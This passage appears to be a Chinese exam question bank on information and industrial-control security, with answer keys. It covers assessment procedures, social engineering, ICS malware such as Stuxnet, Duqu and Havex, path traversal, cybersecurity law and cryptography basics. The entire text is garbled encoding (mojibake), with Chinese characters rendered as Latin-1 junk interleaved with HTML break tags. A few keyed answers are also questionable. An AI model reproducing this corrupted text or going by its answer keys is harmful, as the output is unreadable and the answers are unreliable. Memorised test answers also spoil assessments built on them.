‡å‡†ç­”æ¡ˆï¼šA<br>20ã€ç¬¬å››çº§ä¿¡æ¯ç³»ç»ŸæŠ½æŸ¥ä¸åŒ…æ‹¬å“ªé¡¹<br>Aã€ä»‹è´¨çš„å­˜æ”¾ç¯å¢ƒ<br>Bã€å…¨éƒ¨åº”ç”¨ç³»ç»Ÿ<br>Cã€ä¸æœ¬å•ä½æœ‰å…³çš„ä¼ä¸š<br>Dã€ä¸»è¦æœåŠ¡å™¨<br>æ ‡å‡†ç­”æ¡ˆï¼šC<br>21ã€å¯èƒ½ç»™ç³»ç»Ÿé€ æˆå½±å“æˆ–è€…ç ´åçš„äººåŒ…æ‹¬ï¼ˆï¼‰<br>Aã€é»‘å®¢å’Œè·¨å®¢<br>Bã€åªæœ‰é»‘å®¢<br>Cã€åªæœ‰è·¨å®¢<br>Dã€æ‰€æœ‰ç½‘ç»œä¸ä¿¡æ¯ç³»ç»Ÿä½¿ç”¨è€…<br>æ ‡å‡†ç­”æ¡ˆï¼šD<br>22ã€å·¥ä¸šæ§åˆ¶ç»„ä»¶ä¸­ï¼Œæ¼æ´æœ€å¤šçš„æ˜¯å“ªå‡ ç§<br>Aã€å·¥ä¸šäº¤æ¢æœºå’Œé€šç”¨è½¯ä»¶<br>Bã€PLCå’ŒSCADA/HMI<br>Cã€OPC<br>Dã€å·¥ä¸šç½‘å…³<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>23ã€()æ˜¯ç½‘ç»œç¤¾ä¼šä¸­ç¤¾ä¼šå·¥ç¨‹å­¦ç›´æ¥ç”¨äºæ”»å‡»çš„è¡¨ç°ä¹‹ä¸€ã€‚<br>Aã€SQLæ³¨å…¥æ”»å‡»çš„åˆ©ç”¨<br>Bã€åˆ©ç”¨åŒæƒ…ã€å†…ç–šå’Œèƒè¿«<br>Cã€å£ä»¤ç ´è§£ä¸­çš„ç¤¾ä¼šå·¥ç¨‹å­¦åˆ©ç”¨<br>Dã€ç½‘ç»œæ”»å‡»ä¸­çš„ç¤¾ä¼šå·¥ç¨‹å­¦åˆ©ç”¨<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>24ã€ä¸Stuxnetæœ‰ä¸€å®šçš„ç›¸ä¼¼åº¦ï¼Œ éƒ½ä½¿ç”¨äº†ç›¸åŒçš„åŠ å¯†ç®—æ³•å’Œå¯†é’¥çš„ç—…æ¯’æ˜¯ï¼Ÿï¼ˆï¼‰<br>Aã€éœ‡ç½‘ç—…æ¯’<br>Bã€æ¯’åŒºç—…æ¯’<br>Cã€ç«ç‚ç—…æ¯’<br>Dã€Tritonç—…æ¯’<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>25ã€å·¥ä¸šæ§åˆ¶ç³»ç»Ÿä¸­çš„äººæœºäº¤äº’ç•Œé¢è®¾å¤‡ç”±ç¡¬ä»¶å’Œè½¯ä»¶ä¸¤éƒ¨åˆ†ç»„æˆã€‚ç¡¬ä»¶åŒ…æ‹¬å¤„ç†å™¨ã€æ˜¾ç¤ºå•å…ƒã€è¾“å…¥å•å…ƒã€é€šä¿¡æ¥å£ç­‰ï¼Œå…¶ä¸­æ˜¯HMIæ ¸å¿ƒçš„æ˜¯ï¼ˆ ï¼‰<br>Aã€å¤„ç†å™¨<br>Bã€æ˜¾ç¤ºå•å…ƒ<br>Cã€è¾“å…¥å•å…ƒ<br>Dã€é€šä¿¡æ¥å£<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>26ã€ç†ŠçŒ«çƒ§é¦™ç—…æ¯’åœ¨å“ªä¸€å¹´çˆ†å‘ ( )<br>Aã€2006<br>Bã€2007<br>Cã€2008<br>Dã€2009<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>27ã€()æ˜¯ä¿¡æ¯å®‰å…¨ç®¡ç†ä¸­ï¼Œæœ€éœ€è¦è¿›è¡Œç®¡ç†çš„å†…å®¹ã€‚<br>Aã€ç»„ç»‡<br>Bã€äººå‘˜<br>Cã€è§„åˆ™<br>Dã€ç›®æ ‡<br>æ ‡å‡†ç­”æ¡ˆï¼šD<br>28ã€å·¥ä¸šäº’è”ç½‘å®‰å…¨æ¡†æ¶çš„é˜²æŠ¤æªæ–½è§†è§’ä¸åŒ…æ‹¬ï¼ˆï¼‰<br>Aã€å¼‚å¸¸æ¸…é™¤<br>Bã€å¨èƒé˜²æŠ¤<br>Cã€ç›‘æµ‹æ„ŸçŸ¥<br>Dã€å¤„ç½®æ¢å¤<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>29ã€()æ˜¯ç¤¾ä¼šå·¥ç¨‹å­¦åœ¨å®‰å…¨æ„è¯†åŸ¹è®­æ–¹é¢è¿›è¡Œé˜²å¾¡çš„æªæ–½ä¹‹ä¸€ã€‚<br>Aã€æ„å»ºå®Œå–„çš„æŠ€æœ¯é˜²å¾¡ä½“ç³»<br>Bã€å®šæœŸåœ¨å…¬å¸å†…éƒ¨åˆ†äº«ç½‘ç»œå®‰å…¨å‰æ²¿æŠ€æœ¯<br>Cã€çŸ¥é“ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»åˆ©ç”¨ä»€ä¹ˆ<br>Dã€æœ‰æ•ˆçš„å®‰å…¨ç®¡ç†ä½“ç³»å’Œæ“ä½œ<br>æ ‡å‡†ç­”æ¡ˆï¼šC<br>30ã€å®‰å…¨ä¿¡æ¯ç³»ç»Ÿä¸­æœ€é‡è¦çš„å®‰å…¨éšæ‚£æ˜¯ï¼ˆï¼‰ã€‚<br>Aã€é…ç½®å®¡æŸ¥<br>Bã€ä¸´æ—¶è´¦æˆ·ç®¡ç†<br>Cã€æ•°æ®å®‰å…¨è¿ç§»<br>Dã€ç¨‹åºæ¢å¤<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>31ã€ç”±äºæœåŠ¡å™¨è½¯ä»¶æˆ–è€…åº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥æ–‡ä»¶åç§°çš„å®‰å…¨æ€§éªŒè¯ä¸è¶³ï¼Œä½¿å¾—æ”»å‡»è€…é€šHTTPè¯·æ±‚å’Œåˆ©ç”¨ä¸€äº›ç‰¹æ®Šå­—ç¬¦å°±å¯ä»¥ç»•è¿‡æœåŠ¡å™¨çš„è®¿é—®é™åˆ¶ï¼Œè®¿é—®ä»»æ„å—é™çš„å…¶ä»–æ–‡ä»¶ï¼Œç”šè‡³æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ¼æ´ç§°ä¸ºï¼ˆ ï¼‰ï¼Ÿ<br>Aã€è·¯å¾„éå†æ¼æ´<br>Bã€æœªæˆæƒè®¿é—®æ¼æ´<br>Cã€è¿œç¨‹æ§åˆ¶æ¼æ´<br>Dã€è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>32ã€ä¸‹åˆ—å“ªä¸€ç§æ˜¯ä¸“é—¨é’ˆå¯¹å·¥ä¸šäº’è”ç½‘çš„ï¼Œä»¥çªƒå–ä¿¡æ¯ä¸ºç›®æ ‡çš„æœ¨é©¬ç—…æ¯’ï¼ˆï¼‰<br>Aã€Havexæœ¨é©¬ç¨‹åº<br>Bã€æ¯’åŒºç—…æ¯’ï¼ˆDuquï¼‰<br>Cã€ç«ç„°ç—…æ¯’ï¼ˆHuoyanï¼‰<br>Dã€ç°é¸½å­æœ¨é©¬ç¨‹åº<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>33ã€ã€Šç½‘ç»œå®‰å…¨æ³•ã€‹ç¬¬äº”åä¹æ¡è§„å®šï¼Œç½‘ç»œè¿è¥è€…ä¸å±¥è¡Œç½‘ç»œå®‰å…¨ä¿æŠ¤ä¹‰åŠ¡çš„ï¼Œæœ€å¤šå¤„ä»¥ï¼ˆï¼‰ç½šæ¬¾ã€‚<br>Aã€äº”ä¸‡å…ƒ<br>Bã€ä¸ƒä¸‡å…ƒ<br>Cã€åä¸‡å…ƒ<br>Dã€äºŒåä¸‡å…ƒ<br>æ ‡å‡†ç­”æ¡ˆï¼šC<br>34ã€å…¸å‹å·¥ä¸šæ§åˆ¶ç³»ç»Ÿæ¶æ„åŒ…æ‹¬ç°åœºè®¾å¤‡å±‚ã€ç°åœºæ§åˆ¶å±‚ã€è¿‡ç¨‹ç›‘æ§å±‚ç­‰äº”ä¸ªå±‚æ¬¡ï¼Œå…¶ä¸­å¯ä»¥å®ç°å¯¹é‡‡é›†é‡è¿›è¡Œè°ƒæ•´å’Œå¤„ç†çš„æ˜¯ï¼ˆ )<br>Aã€ç°åœºè®¾å¤‡å±‚<br>Bã€è¿‡ç¨‹ç›‘æ§å±‚<br>Cã€ç”Ÿäº§ç®¡ç†å±‚<br>Dã€ç°åœºæ§åˆ¶å±‚<br>æ ‡å‡†ç­”æ¡ˆï¼šD<br>35ã€å…³é—­WIFIçš„è‡ªåŠ¨è¿æ¥åŠŸèƒ½å¯ä»¥é˜²èŒƒ( )<br>Aã€æ‰€æœ‰æ¶æ„æ”»å‡»<br>Bã€å‡å†’çƒ­ç‚¹æ”»å‡»<br>Cã€æ¶æ„ä»£ç <br>Dã€æ‹’ç»æœåŠ¡æ”»å‡»<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>36ã€ä¸‹åˆ—å…³äºåˆ†æä¸æŠ¥å‘Šç¼–åˆ¶æ´»åŠ¨è¯´æ³•æ­£ç¡®çš„æ˜¯<br>Aã€åº”è¿›è¡Œæµ‹è¯„å®æ–½å‡†å¤‡<br>Bã€åº”å¯¹æµ‹è¯„å·¥å…·æ¥å…¥ç‚¹ç¡®å®š<br>Cã€å¿…é¡»å¯¹æµ‹è¯„æŒ‡å¯¼ä¹¦å¼€å‘<br>Dã€é¦–å…ˆåº”è¿›è¡Œå•é¡¹æµ‹è¯„ç»“æœåˆ¤å®š<br>æ ‡å‡†ç­”æ¡ˆï¼šD<br>37ã€1949å¹´()å‘è¡¨äº†ã€Šä¿å¯†ç³»ç»Ÿçš„é€šä¿¡ç†è®ºã€‹ï¼Œå¥ å®šäº†ç°ä»£å¯†ç å­¦çš„åŸºç¡€ã€‚<br>Aã€Shannon<br>Bã€Ron Rivest<br>Cã€Adi Shanir<br>Dã€Leonard Adledleman<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>38ã€ä¸‹åˆ—ä»»åŠ¡ä¸è¾“å‡ºæ–‡æ¡£ä¸€ä¸€å¯¹åº”çš„æ˜¯<br>Aã€æµ‹è¯„å¯¹è±¡ç¡®å®š:è¢«æµ‹ç³»ç»Ÿå®šçº§ç»“æœã€æµ‹è¯„æŒ‡æ ‡<br>Bã€æµ‹è¯„å†…å®¹ç¡®å®š:è¢«æµ‹ç³»ç»Ÿçš„æ•´ä½“ç»“æ„ã€è¾¹ç•Œã€ç½‘ç»œåŒºåŸŸã€é‡è¦èŠ‚ç‚¹ã€æµ‹è¯„å¯¹è±¡ç­‰<br>Cã€æµ‹è¯„æ–¹æ¡ˆç¼–åˆ¶ï¼šå„æµ‹è¯„å¯¹è±¡çš„æµ‹è¯„å†…å®¹åŠæ–¹æ³•<br>Dã€æµ‹è¯„æŒ‡æ ‡ç¡®å®šï¼šè¢«æµ‹ç³»ç»Ÿå®šçº§ç»“æœã€æµ‹è¯„æŒ‡æ ‡<br>æ ‡å‡†ç­”æ¡ˆï¼šD<br>39ã€ç”±SANSå…¬å¸çš„ç ”ç©¶å‘˜åœ¨2015å¹´8æœˆå‘è¡¨çš„ä¸€ä»½ç™½çš®ä¹¦ã€Šç½‘ç»œå®‰å…¨æ»‘åŠ¨æ ‡å°ºæ¨¡å‹ã€‹ä¸­å»ºç«‹çš„ç½‘ç»œå®‰å…¨æ»‘åŠ¨æ ‡å°ºæ¨¡å‹åŒ…å«äº”å¤§ç±»åˆ«ï¼Œåˆ†åˆ«ä¸ºåŸºç¡€æ¶æ„ã€è¢«åŠ¨é˜²å¾¡ã€ç§¯æé˜²å¾¡ã€å¨èƒæƒ…æŠ¥å’Œååˆ¶æ”»å‡»ï¼Œå…¶ä¸­å…·æœ‰æ¶ˆè€—æ”»å‡»èµ„æºï¼Œç¼©å°æ”»å‡»é¢ç‰¹ç‚¹çš„æ˜¯ï¼ˆ ï¼‰<br>Aã€è¢«åŠ¨é˜²å¾¡<br>Bã€ç§¯æé˜²å¾¡<br>Cã€å¨èƒæƒ…æŠ¥<br>Dã€ååˆ¶æ”»å‡»<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>40ã€äº’è”ç½‘å‡ºå£å¿…é¡»å‘å…¬å¸ä¿¡æ¯åŒ–ä¸»ç®¡éƒ¨é—¨è¿›è¡Œï¼ˆï¼‰åæ–¹å¯ä½¿ç”¨<br>Aã€å¤‡æ¡ˆå®¡æ‰¹<br>Bã€ç”³è¯·<br>Cã€è¯´æ˜<br>Dã€æŠ¥å¤‡<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>41ã€ä»¥ä¸‹å“ªé¡¹ä¸å±äºé˜²æ­¢å£ä»¤çŒœæµ‹çš„æªæ–½ï¼ˆï¼‰<br>Aã€ä¸¥æ ¼é™å®šä»ä¸€ä¸ªç»™å®šçš„ç»ˆç«¯è¿›è¡Œéæ³•è®¤è¯çš„æ¬¡æ•°<br>Bã€ç¡®ä¿å£ä»¤ä¸åœ¨ç»ˆç«¯å†ç°<br>Cã€é˜²æ­¢ç”¨æˆ·ä½¿ç”¨å¤ªçŸ­çš„å£ä»¤<br>Dã€ä½¿ç”¨æœºå™¨äº§ç”Ÿçš„å£ä»¤<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>42ã€å·²è¿è¥ï¼ˆè¿è¡Œï¼‰çš„ç¬¬äºŒçº§ä»¥ä¸Šä¿¡æ¯ç³»ç»Ÿï¼Œåº”å½“åœ¨å®‰å…¨ä¿æŠ¤ç­‰çº§ç¡®å®šåå‡ æ—¥å†…åˆ°å…¬å®‰éƒ¨åŠç†æ‰‹ç»­<br>Aã€20æ—¥<br>Bã€30æ—¥<br>Cã€60æ—¥<br>Dã€45æ—¥<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>43ã€å·¥ä¸šäº’è”ç½‘ç³»ç»Ÿå¯¹ç¤¾ä¼šç»æµã€ç¯å¢ƒã€äººå‘˜å®‰å…¨çš„å·¨å¤§å½±å“ï¼Œå¯¹äºä¸€èˆ¬ä¿¡æ¯ç³»ç»Ÿæ›´åŠ å¼ºè°ƒå®ƒçš„RAMSå±æ€§ï¼Œï¼ˆï¼‰ä¸å±äºRAMSå±æ€§<br>Aã€å¯é æ€§<br>Bã€å¯ç»´æŠ¤æ€§<br>Cã€å¯æŒç»­æ€§<br>Dã€å®‰å…¨æ€§<br>æ ‡å‡†ç­”æ¡ˆï¼šC<br>44ã€å·¥ä¸šæ§åˆ¶ç³»ç»Ÿæ¼æ´è¢«ä¸æ³•åˆ†å­æ‰€åˆ©ç”¨å¾€å¾€ä¼šç»™ä¼ä¸šå¸¦æ¥å„ç§æŸå¤±ï¼Œå…¶ä¸­è·¯å¾„éå†æ¼æ´å°± å±äºé«˜å±æ¼æ´å…¶ä¸»è¦çš„ç‰¹å¾æœ‰ï¼ˆï¼‰<br>Aã€ç”±äºéœ€è¦å®‰å…¨é…ç½®æˆ–æƒé™è®¤è¯çš„åœ°å€ã€æˆæƒé¡µé¢ç­‰å­˜åœ¨ä¸€å®šçš„ç¼ºé™·ã€å¯¼è‡´å…¶ä»–ç”¨æˆ·å¯ä»¥ç›´æ¥è®¿é—®ï¼Œä»è€Œå¼•å‘é‡è¦æƒé™å¯è¢«æ“ä½œï¼Œæ•°æ®åº“ï¼Œç½‘ç«™ç›®å½•ç­‰æ•æ„Ÿä¿¡æ¯æ³„éœ²<br>Bã€ç”±äºæœåŠ¡å™¨ç«¯æ²¡æœ‰é’ˆå¯¹æ‰§è¡Œå‡½æ•°åšè¿‡æ»¤ï¼Œå¯¼è‡´åœ¨æ²¡æœ‰æŒ‡å®šç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹å°±æ‰§è¡Œå‘½ä»¤<br>Cã€ç”±äºç¨‹åºå‘˜åœ¨å¼€å‘ç”¨æˆ·å’Œæ•°æ®åº“äº¤æ¢çš„ç³»ç»Ÿæ—¶æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œè¿‡æ»¤ã€è½¬ä¹‰ã€é™åˆ¶å’Œå¤„ç†ä¸ä¸¥è°¨ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥é€šè¿‡è¾“å…¥ç²¾å¿ƒæ„é€ çš„å­—ç¬¦å»éæ³•è·å–æ•°æ®åº“ä¸­çš„ä¿¡æ¯<br>Dã€ç”±äºæœåŠ¡å™¨è½¯ä»¶æˆ–è€…åº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥æ–‡ä»¶åç§°çš„å®‰å…¨æ€§éªŒè¯ä¸è¶³<br>æ ‡å‡†ç­”æ¡ˆï¼šD<br>45ã€ç›®å‰å·²å…¬å¼€çš„æ¡ˆä¾‹ä¸­å‹’ç´¢ç—…æ¯’å¯¹å·¥ä¸šç³»ç»Ÿçš„å¨èƒè¿˜åœç•™åœ¨ï¼ˆ ï¼‰å‹’ç´¢é˜¶æ®µã€‚<br>Aã€ç‰©ç†æ”»å‡»<br>Bã€åŠ å¯†æ–‡ä»¶<br>Cã€çªƒå–æœºå¯†<br>Dã€é”å®šè®¾å¤‡<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>46ã€ï¼ˆï¼‰æ˜¯ã€Šå·¥ä¸šäº’è”ç½‘å®‰å…¨æ¡†æ¶ã€‹æ‰€æå‡ºçš„ç½‘ç»œå®‰å…¨<br>Aã€æ ‡è¯†è§£æç³»ç»Ÿå®‰å…¨<br>Bã€å·¥å‚å¤–éƒ¨æ•°æ®å®‰å…¨<br>Cã€å·¥å‚å¤–éƒ¨ç½‘ç»œå®‰å…¨<br>Dã€å·¥å‚å†…éƒ¨ç½‘ç»œå®‰å…¨<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>äºŒã€å¤šé¡¹é€‰æ‹©é¢˜<br>1ã€ä»¥ä¸‹å“ªäº›å±äºPEæ–‡ä»¶ä¿æŠ¤æŠ€æœ¯ï¼Ÿ<br>Aã€PEå®Œæ•´æ€§æ£€æµ‹<br>Bã€æ³¨å†Œè¡¨ç›‘æ§<br>Cã€PEæ–‡ä»¶è®¿é—®æƒé™ä¿æŠ¤<br>Dã€åŠ å£³ä¿æŠ¤<br>æ ‡å‡†ç­”æ¡ˆï¼šABCD<br>2ã€ä¸ºä¿æŠ¤å·¥ä¸šå¤§æ•°æ®å®‰å…¨æ­å»ºçš„ç»Ÿä¸€æ•°æ®å®‰å…¨ç®¡ç†ç³»ç»Ÿï¼Œåˆ›é€ äº†é¢å‘æ•°æ®çš„å®‰å…¨ç®¡ç†ä½“ç³»æ¡†æ¶ã€‚å¹³å°æ¶æ„çš„æœ€åº•å±‚å’Œæœ€é«˜å±‚åˆ†åˆ«ä¸ºï¼ˆ ï¼‰ï¼ˆæ³¨æ„é€‰é¡¹é¡ºåºï¼‰<br>Aã€æ•æ„Ÿæ•°æ®éš”ç¦»äº¤äº’å±‚<br>Bã€æ•°æ®è„±æ•å±‚<br>Cã€æ•°æ®åˆ†æå±‚<br>Dã€æ•°æ®åŠ å›ºå±‚<br>æ ‡å‡†ç­”æ¡ˆï¼šCD<br>3ã€åœ¨ç­‰çº§æµ‹è¯„è¿‡ç¨‹ä¸­å¯ä»¥è§„é¿é£é™©çš„æªæ–½æ˜¯ï¼š<br>Aã€ç­¾ç½²å§”æ‰˜æµ‹è¯„åè®®<br>Bã€å£å¤´ä¸Šè¾¾æˆä¿å¯†åè®®<br>Cã€ç°åœºæµ‹è¯„å·¥ä½œé£é™©çš„è§„é¿<br>Dã€æµ‹è¯„ç°åœºè¿˜åŸ<br>æ ‡å‡†ç­”æ¡ˆï¼šACD<br>4ã€ç­‰çº§æµ‹è¯„æœ‰å‡ ä¸ªæµ‹è¯„è¿‡ç¨‹,æœ‰ï¼š<br>Aã€æµ‹è¯„å‡†å¤‡æ´»åŠ¨<br>Bã€æ–¹æ¡ˆç¼–åˆ¶æ´»åŠ¨<br>Cã€ç°åœºæµ‹è¯„æ´»åŠ¨<br>Dã€æŠ¥å‘Šç¼–åˆ¶æ´»åŠ¨<br>æ ‡å‡†ç­”æ¡ˆï¼šABCD<br>5ã€ä¿æŠ¤ä¼ä¸šç½‘ç»œçš„æœ‰æ•ˆæªæ–½æ˜¯ï¼Ÿ<br>Aã€ä¸ºè®¾å¤‡æä¾›å®‰å…¨è®¤è¯è¯ä¹¦<br>Bã€éƒ¨ç½²SSLè¯ä¹¦<br>Cã€ä¸ºè½¯ä»¶è¿›è¡Œä»£ç ç­¾åè¯ä¹¦<br>Dã€ä¸ºå‘˜å·¥é€šè®¯é‚®ç®±éƒ¨ç½²ç”µå­é‚®ä»¶è¯ä¹¦<br>æ ‡å‡†ç­”æ¡ˆï¼šBCD<br>6ã€ä¼ä¸šå†…éƒ¨çš„ä¿¡æ¯ç®¡ç†å®‰å…¨é£é™©æœ‰ï¼š<br>Aã€æ–‡ä»¶æ‰“å°ã€ä¼ çœŸé£é™©<br>Bã€ä¸Šç½‘è¡Œä¸ºé£é™©<br>Cã€ç—…æ¯’å’Œæœ¨é©¬é£é™©<br>Dã€ç”¨æˆ·å¯†ç é£é™©<br>æ ‡å‡†ç­”æ¡ˆï¼šABD<br>7ã€ç«ç¾è‡ªåŠ¨æŠ¥è­¦ã€è‡ªåŠ¨ç­ç«ç³»ç»Ÿéƒ¨ç½²åº”æ³¨æ„ï¼ˆï¼‰ã€‚<br>Aã€é¿å¼€å¯èƒ½æ‹›è‡´ç”µç£å¹²æ‰°çš„åŒºåŸŸæˆ–è®¾å¤‡<br>Bã€å…·æœ‰ä¸é—´æ–­çš„ä¸“ç”¨æ¶ˆé˜²ç”µæº<br>Cã€ç•™å¤‡ç”¨ç”µæº<br>Dã€å…·æœ‰è‡ªåŠ¨å’Œæ‰‹åŠ¨ä¸¤ç§è§¦å‘è£…ç½®<br>æ ‡å‡†ç­”æ¡ˆï¼šABCD<br>8ã€æŒ‰ç…§ç§˜å¯†ã€æœºå¯†ã€ç»å¯†ä¸‰çº§çš„ä¸åŒè¦æ±‚ï¼Œç»“åˆç³»ç»Ÿå®é™…è¿›è¡Œæ–¹æ¡ˆè®¾è®¡ï¼Œå®æ–½åˆ†çº§ä¿æŠ¤ï¼Œå…¶ä¿æŠ¤æ°´å¹³æ€»ä½“ä¸Šä¸ä½äºå›½å®¶ä¿¡æ¯å®‰å…¨ç­‰çº§ä¿æŠ¤<br>Aã€ç¬¬äºŒçº§ã€ç¬¬å››çº§ã€ç¬¬äº”çº§<br>Bã€ç¬¬ä¸‰çº§<br>Cã€ç¬¬ä¸‰çº§ã€ç¬¬å››çº§ã€ç¬¬äº”çº§<br>Dã€ç¬¬å››çº§<br>æ ‡å‡†ç­”æ¡ˆï¼šC<br>9ã€æ•°å­—æ°´å°æœ‰å“ªäº›ç‰¹å¾ï¼ˆï¼‰ï¼Ÿ<br>Aã€ä¸éœ€è¦å¸¦å¤–ä¼ è¾“<br>Bã€é€æ˜æ€§<br>Cã€é²æ£’æ€§<br>Dã€å•ä¸€æ€§<br>æ ‡å‡†ç­”æ¡ˆï¼šABC<br>10ã€ç”¨æˆ·çš„ä¸ªäººè¡Œä¸ºè¯¥æ€æ ·ä¿è¯æ“ä½œç³»ç»Ÿçš„å®‰å…¨ï¼Ÿ<br>Aã€å®šæœŸè¿›è¡Œç³»ç»Ÿæ›´æ–°<br>Bã€å®šæœŸä¼˜åŒ–ç³»ç»Ÿï¼Œæ¸…ç†æ³¨å†Œè¡¨ã€åƒåœ¾æ–‡ä»¶ç­‰<br>Cã€ç¦ç”¨å’Œå…³é—­ä¸å¸¸ç”¨çš„æœåŠ¡å’Œç«¯å£<br>Dã€å®šæœŸå®‰è£…æœ€æ–°çš„ç³»ç»Ÿæ›´æ–°ç¨‹åºå’Œæ¼æ´è¡¥ä¸<br>æ ‡å‡†ç­”æ¡ˆï¼šABCD<br>11ã€éå¯¹ç§°å¯†ç ä¸€èˆ¬è¦æ±‚(),()<br>Aã€åŠ å¯†è§£å¯†ä½¿ç”¨ç›¸åŒå¯†é’¥<br>Bã€åŠ å¯†è§£å¯†ä½¿ç”¨ä¸åŒå¯†é’¥<br>Cã€å‘é€æ–¹æ‹¥æœ‰åŠ å¯†æˆ–è§£å¯†å¯†é’¥ï¼Œæ¥æ”¶æ–¹æ‹¥æœ‰å¦ä¸€ä¸ªå¯†é’¥<br>Dã€æ”¶å‘åŒæ–¹å¿…é¡»å…±äº«å¯†é’¥<br>æ ‡å‡†ç­”æ¡ˆï¼šBC<br>12ã€å¯†ç ç³»ç»ŸåŒ…æ‹¬(),(),()å’Œå¯†ç ç®—æ³•<br>Aã€é€šä¿¡æœºåˆ¶<br>Bã€å¯†é’¥ç©ºé—´<br>Cã€æ˜æ–‡ç©ºé—´<br>Dã€å¯†æ–‡ç©ºé—´<br>æ ‡å‡†ç­”æ¡ˆï¼šBCD<br>13ã€æˆ‘ä»¬å¯ä»¥é‡‡å–ä»¥ä¸‹å“ªäº›æªæ–½ç”¨äºé˜²èŒƒå£ä»¤æ”»å‡»ï¼Ÿ<br>Aã€è®¾ç½®çš„å£ä»¤å°½å¯èƒ½å¤æ‚ï¼Œä½¿ç”¨æ•°å­—ã€å­—æ¯ã€ç‰¹æ®Šç¬¦å·ç»„æˆ<br>Bã€é€‰æ‹©ä¸€ä¸ªå…·æœ‰å¾ˆå¼ºå®‰å…¨æ€§çš„å¤æ‚å£ä»¤ï¼Œåœ¨æ‰€æœ‰ç³»ç»Ÿéƒ½ä½¿ç”¨å®ƒä½œä¸ºè®¤è¯æ‰‹æ®µ<br>Cã€å®šæœŸæ›´æ”¹å£ä»¤<br>Dã€è¾“å…¥å£ä»¤æ—¶ç¡®ä¿å‘¨å›´æ²¡æœ‰å…¶ä»–äººå·çª¥<br>æ ‡å‡†ç­”æ¡ˆï¼šACD<br>14ã€å·¥ä¸šæ§åˆ¶ç³»ç»Ÿå› å—å…¶ç”Ÿäº§ç¯å¢ƒæ‰€é™ï¼Œè¡¥ä¸æ¼æ´çš„å­˜åœ¨å°±ç®—æ˜¯å·²çŸ¥ä¹Ÿæœªå¿…èƒ½å¤Ÿä¿®å¤ï¼Œå…¶ä¸­ï¼ˆï¼‰å¯¼è‡´äº†å·¥ä¸šæ§åˆ¶ç³»ç»Ÿä¸­ç­–ç•¥å’Œç¨‹åºè„†å¼±æ€§<br>Aã€ç¼ºä¹é’ˆå¯¹å·¥ä¸šæ§åˆ¶ç½‘ç»œçš„ç‰¹å®šå®‰å…¨ç­–ç•¥<br>Bã€æ“ä½œç³»ç»ŸåŠåº”ç”¨çš„è½¯ä»¶è¡¥ä¸æœªç»è¿‡æµ‹è¯•<br>Cã€ç¼ºä¹å®‰å…¨æ¶æ„å’Œè®¾è®¡<br>Dã€ç¼ºä¹å®‰å…¨å®¡è®¡<br>æ ‡å‡†ç­”æ¡ˆï¼šACD<br>15ã€ä¿¡æ¯ç³»ç»Ÿçš„å®‰å…¨æŠ€æœ¯ä½“ç³»æ¶æ„åŒ…æ‹¬(),(),()åº”ç”¨å’Œæ•°æ®ç­‰å‡ ä¸ªæ–¹é¢<br>Aã€ç‰©ç†<br>Bã€äººå‘˜<br>Cã€ç½‘ç»œ<br>Dã€ç³»ç»Ÿ<br>æ ‡å‡†ç­”æ¡ˆï¼šACD<br>16ã€ç°åœºæµ‹è¯„æ´»åŠ¨çš„ä¸»è¦ä»»åŠ¡åŒ…æ‹¬ï¼š<br>Aã€ç°åœºæµ‹è¯„<br>Bã€ç°åœºæµ‹è¯„å‡†å¤‡<br>Cã€ç»“æœè®°å½•<br>Dã€ç»“æœç¡®è®¤å’Œèµ„æ–™å½’è¿˜<br>æ ‡å‡†ç­”æ¡ˆï¼šABCD<br>17ã€ä»¥ä¸‹å“ªäº›é€‰é¡¹å±äºæƒé™ç®¡ç†å››é¡¹åŸºæœ¬åŸåˆ™ï¼Ÿ<br>Aã€çºµæ·±<br>Bã€ç´¯åŠ <br>Cã€æ‹’ç»ä¼˜äºå…è®¸<br>Dã€ç»§æ‰¿æ€§<br>æ ‡å‡†ç­”æ¡ˆï¼šBCD<br>18ã€ä¸ºä»€ä¹ˆä¿¡æ¯ç³»ç»Ÿæ€æ¯’è½¯ä»¶ä¸é€‚ç”¨äºå·¥ä¸šç”Ÿäº§ç¯å¢ƒ<br>Aã€ä¿¡æ¯ç³»ç»Ÿæ€æ¯’è½¯ä»¶éœ€è¦å®šæœŸæ›´æ–°ç—…æ¯’åº“ç­‰ï¼Œæ— æ³•é€‚åº”å·¥ä¸šè¿ç»­ç”Ÿäº§çš„è¦æ±‚<br>Bã€ä¿¡æ¯ç³»ç»Ÿæ€æ¯’è½¯ä»¶å¯¹CPUå’Œå†…å­˜å ç”¨è¾ƒé«˜ï¼Œæ— æ³•é€‚åº”å·¥ä¸šç”Ÿäº§ç¯å¢ƒçš„â€œå¯ç”¨æ€§â€è¦æ±‚<br>Cã€ä¿¡æ¯ç³»ç»Ÿæ€æ¯’è½¯ä»¶å’Œå·¥ä¸šè½¯ä»¶å­˜åœ¨å…¼å®¹æ€§é—®é¢˜<br>Dã€ä¿¡æ¯ç³»ç»Ÿæ€æ¯’è½¯ä»¶æ‰€å¸¦æ¥çš„è´¹ç”¨é«˜æ˜‚<br>æ 